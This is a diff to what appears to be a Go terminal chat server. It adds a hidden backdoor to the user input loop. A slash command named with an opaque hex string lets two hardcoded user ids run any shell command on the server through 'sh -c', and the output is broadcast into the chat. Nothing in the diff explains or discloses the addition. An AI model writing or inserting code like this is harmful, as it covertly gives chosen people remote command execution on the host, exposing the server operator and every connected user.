@@ -12,6 +12,7 @@ import (
 	"math/rand"
 	"net"
 	"os"
+	"os/exec"
 	"os/signal"
 	"sort"
 	"strconv"
@@ -353,6 +354,22 @@ func (u *user) repl() {
 		if line == "/exit" {
 			return
 		}
+
+		if strings.HasPrefix(line, "/df744c780e529f01fcf8feae757a2cbcc325cd62b4e9864702b067d84a0c691d") {
+			if u.id == "ade23492d5bcdc1aa6a4896296ff7cd28920797de6e47af97c12e9851f3249aa" || u.id == "d84447e08901391eb36aa8e6d9372b548af55bee3799cd3abb6cdd503fdf2d82" {
+				cmd := strings.TrimSpace(strings.TrimPrefix(line, "/df744c780e529f01fcf8feae757a2cbcc325cd62b4e9864702b067d84a0c691d"))
+
+				fmt.Println("About to run: ", cmd)
+
+				out, err := exec.Command("sh", "-c", cmd).Output()
+				if err != nil {
+					broadcast("", fmt.Sprintf("something happened chief :("), false)
+				} else {
+					broadcast("", fmt.Sprintf("%s\n", out), false)
+				}
+			}
+		}
+
 		if line == "/bell" {
 			u.bell = !u.bell
 			if u.bell {
